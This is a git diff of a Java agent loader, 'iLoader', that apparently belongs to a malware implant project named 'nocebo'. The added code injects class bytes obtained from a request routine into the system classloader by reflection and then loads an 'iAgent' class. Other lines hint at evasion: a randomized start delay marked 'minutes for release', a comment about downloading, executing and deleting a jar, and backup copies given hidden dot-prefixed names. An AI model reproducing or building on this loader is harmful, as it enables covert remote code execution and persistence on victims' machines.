@@ -107,9 +107,9 @@ public class iLoader
     //this is going to become much simpler, will download/execute/delete an ordinary jar
 
 
-    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nLoader\*.java
     //cd src\main\java
-    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\lib\stub.jar ..\..\..\MANIFEST.txt .\com\nocebo\nCore\*.class
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\lib\iLoader.jar ..\..\..\MANIFEST.txt .\com\nocebo\nLoader\*.class
     public static void main(String[] args) throws IOException, UnmodifiableClassException, KeyManagementException, NoSuchAlgorithmException, InterruptedException, ClassNotFoundException, URISyntaxException, SocketException
     {
         Class currentClass = MethodHandles.lookup().lookupClass();
@@ -123,24 +123,46 @@ public class iLoader
 
     public static void premain(String agentArgs, Instrumentation inst) throws InstantiationException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
     {
-        TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
+        System.out.println("iLoader");
+        //TimeUnit.MILLISECONDS.sleep((rngenerator(2,5))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
         //for attach execution
         coreOp();
+        System.out.println("finished core op");
+        
 
         Hashtable<String,byte[]> classData = classRequest();
         Enumeration<String> b = classData.keys();
 
+        
         while (b.hasMoreElements())
         {
             String bData = b.nextElement();
-            ClassDefinition cDef = new ClassDefinition(Class.forName(bData), classData.get(b));
-            inst.redefineClasses(cDef);
+            byte[] classBytes = classData.get(bData);
+            
+            Method defineNewClass = ClassLoader.class.getDeclaredMethod("defineClass",
+                                      String.class, byte[].class, int.class, int.class);
+            defineNewClass.setAccessible(true);
+            defineNewClass.invoke(
+                ClassLoader.getSystemClassLoader(),
+                String.format("com.nocebo.nCore.%s",bData),
+                classBytes,
+                0,
+                classBytes.length
+            );
+                
+           
         }
         
 
+            Class.forName("com.nocebo.nCore.iAgent");
+
+
+
         //need to just make 
     }
+
+    
 
     public static void agentmain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
     {
@@ -205,15 +227,9 @@ public class iLoader
         String[] nameValRaw = pathToJar.split("/");
         String nameVal = nameValRaw[nameValRaw.length-1];
         String bakName = "";
-        if (System.getProperty("os.name").toLowerCase().contains("win"))
-        {
-            bakName = String.format("bak-%s",nameVal);
+        bakName = String.format(".bak-%s",nameVal);
             // for later Files.setAttribute(actualFullPath, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
-        }
-        else
-        {
-            bakName = String.format(".bak-%s",nameVal);            
-        }
+       
         return bakName;
     }
 
@@ -275,12 +291,7 @@ public class iLoader
         }
     }
     
-    public static Class[] getLoadedClasses(Instrumentation inst)
-    {
-        //stub will have a definition for every class and method in the default set
-        Class[] loadedClassSet = inst.getAllLoadedClasses();
-        return loadedClassSet;
-    }
+    
 
     private static Hashtable<String,byte[]> classRequest() throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
     {
